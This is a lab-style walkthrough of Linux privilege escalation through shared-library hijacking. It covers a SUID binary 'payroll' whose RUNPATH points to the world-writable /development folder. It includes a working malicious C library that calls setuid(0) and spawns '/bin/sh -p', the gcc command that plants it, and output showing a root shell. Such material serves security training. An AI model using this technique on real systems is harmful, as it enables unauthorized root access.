You may find a binary with SUID permissions; in our case we have `payroll`.

There is a **binary file** named `payroll` that runs with **root privileges** (because it has the `suid` bit set). But it depends on an external **shared library** called `libshared.so`.

This library is **not located in a secure system folder** like `/lib`, but instead in a **world-writable folder**: `/development/`.

That means **any user (even low-privilege)** can **replace** the library with a **malicious one** — and **trick the root program** into running their code!


#### <span style="color:#FFB86C">Step 1: Identify a SUID Binary</span>

You found a binary like this:
```bash
ls -la payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```
### <span style="color:#50FA7B">Step 2: Check Which Libraries It Loads</span>

Use `ldd` to list shared libraries used by `payroll`:
```bash
ldd payroll
```

You saw this:
```bash
`libshared.so => /development/libshared.so`
```
🚨 It is loading `libshared.so` from a folder **we can write to**!

### <span style="color:#50FA7B">Step 3: Verify If It Has a Custom Load Path</span>

You used `readelf` to confirm:
```bash
`readelf -d payroll | grep PATH`
```

You saw:

```bash
0x000000000000001d (RUNPATH) Library runpath: [/development]
```
🔥 This tells the binary to load libraries from `/development` **first**, even before default folders like `/lib`.

### <span style="color:#50FA7B">Step 4: Write a Malicious Library `src.c`</span>
You made a C file like this:

```bash
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

- This creates a function named `dbquery()` (which `payroll` expects).
- Inside that function:
    - `setuid(0)` → switch to root
    - `system("/bin/sh -p")` → pop a shell **as root**

## <span style="color:#8BE9FD">Step 5: Compile Your Evil Library</span>
```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```
- `-fPIC`: Position-independent code (required for shared libraries)
- `-shared`: Create `.so` (shared object)

### <span style="color:#50FA7B">Step 7: Run the Root Program</span>
```bash
`./payroll`
```

You saw:

```bash
Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n)
```
🎉 Boom! Root shell!